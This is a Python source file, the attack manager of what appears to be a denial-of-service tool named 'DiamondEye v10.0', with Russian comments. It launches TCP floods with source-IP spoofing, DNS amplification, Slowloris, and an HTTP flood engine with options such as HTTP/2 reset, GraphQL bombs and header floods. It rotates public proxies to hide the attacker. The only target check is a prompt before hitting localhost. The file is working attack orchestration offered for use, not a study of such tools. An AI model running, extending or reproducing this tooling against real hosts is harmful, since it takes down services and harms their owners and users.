# core/attack_manager.py
import asyncio
import time
import signal
import psutil
from typing import Dict, Any, Optional
import logging
from urllib.parse import urlparse
from colorama import Fore, Style

# Импортируем новый движок HTTP-атак
from attack import HttpAttackEngine

try:
    from layers.layer4.tcp_flood import TCPFlood
    from layers.amplification.dns_amp import DNSAmplifier
    from proxy.manager import ProxyManager
except ImportError as e:
    print(f"{Fore.YELLOW}⚠️  Missing module: {e}. Some features disabled.{Style.RESET_ALL}")
    
    # Заглушки для отсутствующих модулей
    class TCPFlood:
        def __init__(self, **kwargs): pass
        async def start(self): pass
        def stop(self): pass
    
    class DNSAmplifier:
        def __init__(self, **kwargs): pass
        async def start(self): pass
        def stop(self): pass
    
    class ProxyManager:
        def __init__(self): self.proxies = []
        async def load_from_file(self, *args): pass
        async def fetch_proxies(self): pass
        async def check_all(self, *args): pass
        async def start_background_check(self): pass
        async def stop_background_check(self): pass
        def get_next_proxy(self): return None
        def print_stats(self): pass

from core.resource_monitor import ResourceMonitor

# Настройка логгера
logger = logging.getLogger(__name__)


class AttackManager:
    """Главный менеджер для управления всеми типами атак."""
    
    def __init__(self, args):
        self.args = args
        self.active_attack = None
        self.proxy_manager = None
        self.resource_monitor = None
        self.bypass_tech = None
        self.start_time = time.time()
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'rps_history': [],
            'bandwidth_history': []
        }
        self._running = False
        self._shutdown_event = asyncio.Event()
        self._monitor_task = None
        
    async def initialize(self):
        """Инициализация менеджера."""
        logger.info("Initializing DiamondEye v10.0...")
        
        # Инициализация прокси-менеджера
        if self.args.proxy_auto or self.args.proxy_file:
            self.proxy_manager = ProxyManager()
            await self._setup_proxies()
        
        # Инициализация монитора ресурсов
        alert_threshold = getattr(self.args, 'resource_alert', 90)
        self.resource_monitor = ResourceMonitor(alert_threshold=alert_threshold)
        
        # Проверка цели
        if self.args.attack_type in ['tcp', 'udp', 'syn', 'dns', 'ntp']:
            if not self.args.target_ip:
                logger.error(f"Target IP required for {self.args.attack_type} attack")
                return False
        
        # Для slowloris через плагин
        if self.args.attack_type == 'slowloris' and not self.args.target_ip and not self.args.url:
            logger.error("Target required for slowloris attack")
            return False
                
        return True
    
    async def _setup_proxies(self):
        """Настройка системы прокси."""
        if self.args.proxy_file:
            logger.info(f"Loading proxies from {self.args.proxy_file}...")
            await self.proxy_manager.load_from_file(self.args.proxy_file)
        elif self.args.proxy_auto:
            logger.info("Fetching proxies from public sources...")
            await self.proxy_manager.fetch_proxies()
        
        if self.proxy_manager and self.proxy_manager.proxies:
            logger.info("Checking proxy availability...")
            await self.proxy_manager.check_all(concurrency=50, timeout=self.args.proxy_timeout)
            # Запускаем фоновую проверку
            await self.proxy_manager.start_background_check()
            self.proxy_manager.print_stats()
    
    async def start_attack(self):
        """Запуск выбранного типа атаки."""
        logger.info(f"Starting {self.args.attack_type.upper()} attack")
        
        self._running = True
        self._shutdown_event.clear()
        
        # Установка обработчика сигналов
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, lambda: asyncio.create_task(self.stop_attack()))
            except NotImplementedError:
                # На Windows сигналы работают иначе
                pass
        
        # Запуск мониторинга ресурсов
        self._monitor_task = asyncio.create_task(
            self.resource_monitor.monitor(interval=getattr(self.args, 'monitor_interval', 1.0))
        )
        
        try:
            if self.args.attack_type == 'tcp':
                await self._start_tcp_attack()
            elif self.args.attack_type == 'dns':
                await self._start_dns_amplification()
            elif self.args.attack_type == 'slowloris':
                await self._start_slowloris_attack()
            else:
                # HTTP/S атака по умолчанию (включая http, https, websocket и т.д.)
                await self._start_http_attack()
                
        except Exception as e:
            logger.error(f"Attack error: {e}", exc_info=self.args.debug)
        finally:
            await self.stop_attack()
            if self._monitor_task:
                self._monitor_task.cancel()
    
    async def _start_tcp_attack(self):
        """Запуск TCP флуда."""
        logger.info(f"TCP Flood targeting {self.args.target_ip}:{self.args.target_port}")
        
        flood = TCPFlood(
            target_ip=self.args.target_ip,
            target_port=self.args.target_port,
            workers=self.args.workers * 2,  # Больше воркеров для Layer4
            spoof_ip=self.args.spoof_ip,
            packet_size=getattr(self.args, 'packet_size', 1024)
        )
        
        self.active_attack = flood
        await flood.start()
    
    async def _start_dns_amplification(self):
        """Запуск DNS амплификации."""
        logger.info(f"DNS Amplification targeting {self.args.target_ip}")
        
        amplifier = DNSAmplifier(
            target_ip=self.args.target_ip,
            amplification_factor=50,
            workers=self.args.workers
        )
        
        self.active_attack = amplifier
        await amplifier.start()
    
    async def _start_slowloris_attack(self):
        """Запуск Slowloris атаки через плагин."""
        from plugins.slowloris_plugin import SlowlorisPlugin
        
        logger.info("Starting Slowloris attack via plugin")
        
        target = self.args.target_ip or self.args.url
        if not target:
            raise ValueError("No target specified for slowloris")
        
        # Извлекаем хост и порт из URL или IP
        if '://' in target:
            from urllib.parse import urlparse
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        else:
            host = target
            port = self.args.target_port or 80
        
        plugin = SlowlorisPlugin()
        await plugin.initialize({
            'host': host,
            'port': port,
            'max_connections': self.args.workers * 50,
            'timeout': getattr(self.args, 'timeout', 10)
        })
        
        self.active_attack = plugin
        await plugin.execute(f"{host}:{port}", duration=self.args.duration)
    
    async def _start_http_attack(self):
        """Запуск HTTP атаки через новый движок HttpAttackEngine."""
        
        # Проверка на localhost
        if self.args.url:
            parsed = urlparse(self.args.url)
            hostname = parsed.hostname.lower() if parsed.hostname else ""
            
            if hostname in ('localhost', '127.0.0.1', '0.0.0.0') or hostname.startswith('127.'):
                logger.warning(f"{Fore.YELLOW}⚠️  Target is localhost!{Style.RESET_ALL}")
                if not getattr(self.args, 'confirm_local', False):
                    print(f"{Fore.RED}Attacking localhost may crash your system.{Style.RESET_ALL}")
                    response = input(f"{Fore.YELLOW}Type 'I UNDERSTAND' to continue: {Style.RESET_ALL}")
                    if response.strip().upper() != 'I UNDERSTAND':
                        logger.info("Attack cancelled by user")
                        return
        
        # Подготовка прокси
        proxy = self.args.proxy
        if self.proxy_manager and self.proxy_manager.proxies:
            proxy = self.proxy_manager.get_next_proxy()
            if proxy:
                logger.info(f"Using proxy: {proxy}")
        
        # Создаём экземпляр движка с передачей лимитов
        attack = HttpAttackEngine(
            url=self.args.url,
            workers=self.args.workers,
            sockets=self.args.sockets,
            methods=self.args.methods,
            useragents=self.args.useragents,
            no_ssl_check=self.args.no_ssl_check,
            debug=self.args.debug,
            proxy=proxy,
            use_http2=self.args.http2,
            use_http3=self.args.http3,
            websocket=self.args.websocket,
            auth=self.args.auth,
            h2reset=self.args.h2reset,
            graphql_bomb=self.args.graphql_bomb,
            adaptive=self.args.adaptive,
            slow_rate=getattr(self.args, 'slow', 0.0),
            extreme=self.args.extreme,
            data_size=self.args.data_size,
            flood=self.args.flood,
            path_fuzz=self.args.path_fuzz,
            header_flood=self.args.header_flood,
            method_fuzz=self.args.method_fuzz,
            junk=self.args.junk,
            random_host=self.args.random_host,
            max_rps=self.args.max_rps,          
            max_bandwidth=self.args.max_bandwidth,
            slow_connections=getattr(self.args, 'slow_connections', 1000)
        )
        
        self.active_attack = attack
        
        # Если задана длительность, запускаем таймер
        if self.args.duration > 0:
            asyncio.create_task(self._duration_timer())
        
        await attack.start()
    
    async def _duration_timer(self):
        """Таймер для автоматической остановки атаки по длительности."""
        await asyncio.sleep(self.args.duration)
        if self._running:
            logger.info(f"Duration {self.args.duration}s reached, stopping attack")
            await self.stop_attack()
    
    async def stop_attack(self):
        """Остановка текущей атаки."""
        if not self._running:
            return
            
        logger.info("Stopping attack...")
        self._running = False
        self._shutdown_event.set()
        
        # Останавливаем активную атаку
        if self.active_attack:
            if hasattr(self.active_attack, 'stop'):
                # Для синхронных атак (TCP, DNS)
                self.active_attack.stop()
            elif hasattr(self.active_attack, 'shutdown'):
                # Для асинхронных атак (HTTP)
                await self.active_attack.shutdown()
            elif hasattr(self.active_attack, 'cleanup'):
                # Для плагинов
                await self.active_attack.cleanup()
        
        # Останавливаем фоновую проверку прокси
        if self.proxy_manager:
            await self.proxy_manager.stop_background_check()
        
        # Останавливаем монитор ресурсов
        if self.resource_monitor:
            self.resource_monitor.stop()
        
        # Генерация отчёта
        await self._generate_report()
        
        logger.info("Attack stopped")
    
    async def _generate_report(self):
        """Генерация детального отчёта."""
        duration = time.time() - self.start_time
        
        # Собираем статистику из активной атаки
        if self.active_attack and hasattr(self.active_attack, 'sent'):
            self.stats['packets_sent'] = getattr(self.active_attack, 'sent', 0)
            self.stats['errors'] = getattr(self.active_attack, 'failed', 0)
            
            if hasattr(self.active_attack, 'rps_history'):
                self.stats['rps_history'] = self.active_attack.rps_history
        
        if self.resource_monitor:
            resource_report = self.resource_monitor.get_report()
        else:
            resource_report = {}
        
        report = {
            'attack_type': self.args.attack_type,
            'duration': duration,
            'stats': self.stats,
            'resources': resource_report,
            'config': {
                'workers': self.args.workers,
                'target': self.args.target_ip or self.args.url,
                'timestamp': time.time()
            }
        }
        
        # Сохранение отчёта
        if self.args.log:
            self._save_text_report(report)
        if self.args.json:
            self._save_json_report(report)
    
    def _save_text_report(self, report):
        """Сохранение текстового отчёта."""
        try:
            with open(self.args.log, 'w', encoding='utf-8') as f:
                f.write(f"DiamondEye v10.0 - Attack Report\n")
                f.write(f"{'='*50}\n")
                f.write(f"Attack Type: {report['attack_type']}\n")
                f.write(f"Duration: {report['duration']:.2f}s\n")
                f.write(f"Packets Sent: {report['stats'].get('packets_sent', 0)}\n")
                f.write(f"Errors: {report['stats'].get('errors', 0)}\n")
                
                if report['stats'].get('rps_history'):
                    avg_rps = sum(p['rps'] for p in report['stats']['rps_history']) / len(report['stats']['rps_history'])
                    f.write(f"Average RPS: {avg_rps:.1f}\n")
                
                f.write(f"\nResource Usage:\n")
                if report['resources']:
                    f.write(f"CPU: {report['resources'].get('cpu', {}).get('average', 0):.1f}%\n")
                    f.write(f"RAM: {report['resources'].get('ram', {}).get('average', 0):.1f}%\n")
                    
                    network = report['resources'].get('network', {})
                    f.write(f"Network Sent: {network.get('total_sent_mb', 0):.2f} MB\n")
                    f.write(f"Average Send Rate: {network.get('average_sent_mbps', 0):.2f} Mbps\n")
            
            logger.info(f"Text report saved to {self.args.log}")
        except Exception as e:
            logger.error(f"Failed to save text report: {e}")
    
    def _save_json_report(self, report):
        """Сохранение JSON отчёта."""
        import json
        try:
            with open(self.args.json, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False, default=str)
            logger.info(f"JSON report saved to {self.args.json}")
        except Exception as e:
            logger.error(f"Failed to save JSON report: {e}")